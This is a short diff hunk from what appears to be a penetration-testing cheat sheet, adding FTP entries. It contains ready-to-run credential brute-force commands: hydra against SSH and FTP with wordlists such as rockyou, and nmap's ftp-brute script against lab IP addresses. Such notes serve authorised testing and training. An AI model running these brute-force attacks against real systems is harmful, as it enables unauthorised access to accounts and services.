@@ -158,6 +158,11 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 ssh
 
 
 # 9. FTP <a name="ftp"></a>
+
+- `ftp  192.168.112.50 21`
+```
+hydra -L /unix_users.txt -P /unix_passwords.txt 192.168.112.50 ftp
+```
 ```
 nmap -Pn -A -p 21 -T4 --script=ftp-brute.nse --script-args userdb=/root/usr 10.0.1.22  -o namp
 ```
